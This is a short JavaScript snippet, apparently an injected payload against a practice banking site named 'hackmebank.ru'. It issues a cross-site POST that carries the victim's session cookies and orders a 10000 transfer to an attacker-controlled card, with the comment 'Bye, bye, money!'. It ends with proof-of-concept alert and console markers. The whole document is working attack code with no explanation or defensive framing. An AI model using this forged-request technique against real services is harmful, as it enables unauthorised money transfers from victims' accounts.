fetch('http://hackmebank.ru/transfer/transferByCardNumber', {
    method: 'POST',
    credentials: 'include',
    body: 'fromSerialNumber=40817810300004562147&toHackMeWallet=4371081842239017&comment=Bye%2C+bye%2C+money%21&amountMoney=10000',
	headers: {
        'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': 1,
		'Content-Type': 'application/x-www-form-urlencoded',
		'Referer': 'http://hackmebank.ru/transferOperation',
 		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
}).then(response => console.log("Response status: ", response.status));

alert('1');
console.log('86125892')
